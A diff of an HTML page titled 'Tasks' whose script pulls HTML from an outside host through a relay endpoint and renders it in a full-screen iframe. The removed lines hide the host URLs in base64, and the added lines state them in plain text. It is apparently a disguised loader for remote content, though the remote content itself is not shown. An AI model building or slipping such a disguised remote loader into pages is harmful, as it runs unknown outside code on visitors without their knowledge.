@@ -5,35 +5,65 @@
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
 <title>Tasks</title>
 <style>
-html,body{margin:0;padding:0;height:100%;overflow:hidden;background:#111;color:#fff;font-family:sans-serif}
-#x1{width:100%;height:100%;border:none}
-#x2{position:absolute;top:50%;left:50%;transform:translate(-50%,-50%)}
+html, body {
+  margin: 0;
+  padding: 0;
+  height: 100%;
+  overflow: hidden;
+  background: #111;
+  color: #fff;
+  font-family: sans-serif;
+}
+#x1 {
+  width: 100%;
+  height: 100%;
+  border: none;
+}
+#x2 {
+  position: absolute;
+  top: 50%;
+  left: 50%;
+  transform: translate(-50%, -50%);
+}
 </style>
 </head>
 <body>
 <div id="x2">Loading...</div>
 <iframe id="x1"></iframe>
 <script>
-(function(){
-    const _0x4f = function(s){return decodeURIComponent(escape(atob(s)))};
-    const A = _0x4f("aHR0cHM6Ly9sb2dpc3RpY2FsLXV0aWxpdGllcy52ZXJjZWwuYXBw");
-    const B = _0x4f("aHR0cHM6Ly9jb3JlLWxvZ2ljLXV0aWxzLmdpdGh1Yi5pbw==");
-    const C = A + "/api/relay?url=" + encodeURIComponent(B);
-    fetch(C).then(function(D){
-        if(!D.ok) throw new Error("x");
-        return D.text();
-    }).then(function(E){
-        document.getElementById("x2").style.display="none";
-        let F = E;
-        if(F.indexOf("<head>")!==-1){
-            F = F.replace("<head>","<head><base href=\"" + B + "/\">");
-        } else {
-            F = "<base href=\"" + B + "/\">" + F;
-        }
-        document.getElementById("x1").srcdoc = F;
-    }).catch(function(G){
-        console.log("x",G);
-        document.getElementById("x2").innerText="Failed.";
+(function() {
+  function decodeBase64(str) {
+    return decodeURIComponent(escape(atob(str)));
+  }
+
+  const relayBase = "https://core-logic-utils.github.io/network";
+  const targetOrigin = "https://core-logic-utils.github.io";
+
+  const proxyUrl = relayBase + "/api/relay?url=" + encodeURIComponent(targetOrigin);
+
+  fetch(proxyUrl)
+    .then(function(response) {
+      if (!response.ok) throw new Error("fetch failed");
+      return response.text();
+    })
+    .then(function(html) {
+      document.getElementById("x2").style.display = "none";
+        
+      let processed = html;
+      if (processed.indexOf("<head>") !== -1) {
+        processed = processed.replace(
+          "<head>",
+          '<head><base href="' + targetOrigin + '/">'
+        );
+      } else {
+        processed = '<base href="' + targetOrigin + '/">' + processed;
+      }
+
+      document.getElementById("x1").srcdoc = processed;
+    })
+    .catch(function(err) {
+      console.log("error", err);
+      document.getElementById("x2").innerText = "Failed.";
     });
 })();
 </script>
